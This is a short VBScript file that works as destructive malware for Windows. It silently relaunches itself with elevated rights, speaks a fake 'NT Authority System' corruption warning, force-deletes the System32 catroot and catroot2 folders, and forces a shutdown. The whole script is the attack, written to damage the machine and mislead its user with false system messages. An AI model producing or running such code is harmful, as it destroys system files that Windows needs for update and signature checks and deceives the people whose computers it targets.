Set shell = CreateObject("Shell.Application")
Set fso = CreateObject("Scripting.FileSystemObject")
Set sapi = CreateObject("SAPI.SpVoice")
Set wshell = CreateObject("WScript.Shell")

If Not IsAdmin() Then
    shell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 0
    WScript.Quit
End If

sapi.Speak "NT Authority System has detected corruption. The folder catroot has been deleted."

On Error Resume Next
fso.DeleteFolder "C:\Windows\System32\catroot", True
fso.DeleteFolder "C:\Windows\System32\catroot2", True
On Error GoTo 0

sapi.Speak "System is unstable. Shutting down."

wshell.Run "shutdown -s -f -t 5 -c ""Critical system resource catroot was removed. Shutdown required.""", 0, False

Function IsAdmin()
    On Error Resume Next
    Dim test
    test = GetObject("winmgmts:root\cimv2:Win32_Process")
    IsAdmin = (Err.Number = 0)
    On Error GoTo 0
End Function
